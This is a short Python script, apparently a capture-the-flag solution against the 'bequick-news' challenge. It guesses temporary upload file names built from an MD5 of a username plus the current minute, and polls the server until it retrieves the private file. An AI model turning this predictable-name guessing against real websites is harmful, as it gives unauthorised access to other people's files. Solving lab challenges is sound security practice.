import sys
import requests
import hashlib
import time
import math

user = "tipuser"

while True:
    now = math.floor(time.time() / 60)
    rawstring = user + str(now)
    secure = hashlib.md5(rawstring.encode("utf-8")).hexdigest()
    url = "https://bequick-news.chall.uiactf.no/static/tmp_upload/" + secure + ".txt"

    r = requests.get(url)

    if r.status_code == 200:
        print(r.text)
        sys.exit(0)
    else:
        print("Nope")
        time.sleep(1)
